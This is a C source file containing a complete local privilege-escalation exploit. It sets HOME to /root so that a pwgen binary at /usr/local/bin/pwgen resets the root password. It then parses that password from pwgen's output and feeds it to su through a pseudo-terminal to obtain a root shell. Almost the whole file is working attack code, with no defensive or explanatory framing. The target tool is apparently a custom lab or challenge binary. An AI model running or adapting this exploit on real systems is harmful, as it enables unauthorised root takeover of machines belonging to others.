/*
Exploit details: 
Tricks pwgen's get_uid and get_username into selecting root.
Then use pwgen to change the root password.
Then use the new root password to login as root and gain root shell
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pty.h>      // for forkpty()
#include <utmp.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <sys/select.h>

#define PWGEN_CMD "/usr/local/bin/pwgen -w"

int main(void) {
    char line[256];
    char password[256] = {0};

    //Changing the HOME environment variable to /root
    if (setenv("HOME", "/root", 1) != 0) {
        perror("setenv");
        exit(EXIT_FAILURE);
    }

    //Execute the pwgen command and save output
    FILE *fp = popen(PWGEN_CMD, "r");
    if (!fp) {
        perror("popen");
        exit(EXIT_FAILURE);
    }

    //Extracting the password string from pwgen output
    while (fgets(line, sizeof(line), fp) != NULL) {

        if (strstr(line, "Generated password") != NULL) {
            char *colon = strchr(line, ':');
            if (colon) {
                colon++;  // skip the colon
                // Skip any leading whitespace
                while (*colon == ' ' || *colon == '\t') {
                    colon++;
                }
                // Copy until a whitespace or newline is encountered
                char *end = colon;
                while (*end && *end != '\n' && *end != ' ' && *end != '\t') {
                    end++;
                }
                size_t len = end - colon;
                if (len >= sizeof(password)) {
                    len = sizeof(password) - 1;
                }
                strncpy(password, colon, len);
                password[len] = '\0';
            }
        }
    }
    pclose(fp);

    if (strlen(password) == 0) {
        fprintf(stderr, "Failed to extract password from pwgen output.\n");
        exit(EXIT_FAILURE);
    }
    printf("Extracted password: %s\n", password);

    //Fork a pseudo-terminal and launch "su" so we can feed it the password
    int master_fd;
    pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);
    if (pid < 0) {
        perror("forkpty");
        exit(EXIT_FAILURE);
    } else if (pid == 0) {
        //Execute su 
        execlp("su", "su", NULL);
        perror("execlp su");
        exit(EXIT_FAILURE);
    }

    // Parent process: interact with the su process 
    {
        char buf[256];
        fd_set fds;
        int password_sent = 0;

        /* Loop to forward output from the su process to stdout and wait
         * for the "Password:" prompt.
         */
        while (1) {
            FD_ZERO(&fds);
            FD_SET(STDIN_FILENO, &fds);
            FD_SET(master_fd, &fds);
            int max_fd = (STDIN_FILENO > master_fd) ? STDIN_FILENO : master_fd;

            int ret = select(max_fd + 1, &fds, NULL, NULL, NULL);
            if (ret < 0) {
                perror("select");
                break;
            }

            /* If there is output from the su process, read and print it */
            if (FD_ISSET(master_fd, &fds)) {
                ssize_t n = read(master_fd, buf, sizeof(buf) - 1);
                if (n > 0) {
                    buf[n] = '\0';
                    printf("%s", buf);
                    /* Look for the password prompt */
                    if (!password_sent && strstr(buf, "Password:") != NULL) {
                        /* Write the extracted password plus newline */
                        printf("\nSending password to su process\n");
                        write(master_fd, password, strlen(password));
                        write(master_fd, "\n", 1);
                        password_sent = 1;
                        printf("Success: run whoami to verify\n");
                    }
                } else {
                    /* su process closed the output (or error occurred) */
                    break;
                }
            }

            /* Forward any user input from STDIN to the su process */
            if (FD_ISSET(STDIN_FILENO, &fds)) {
                ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
                if (n > 0) {
                    write(master_fd, buf, n);
                } else {
                    break;
                }
            }
        }

        /* Wait for the su child process to finish */
        wait(NULL);
    }

    return 0;
}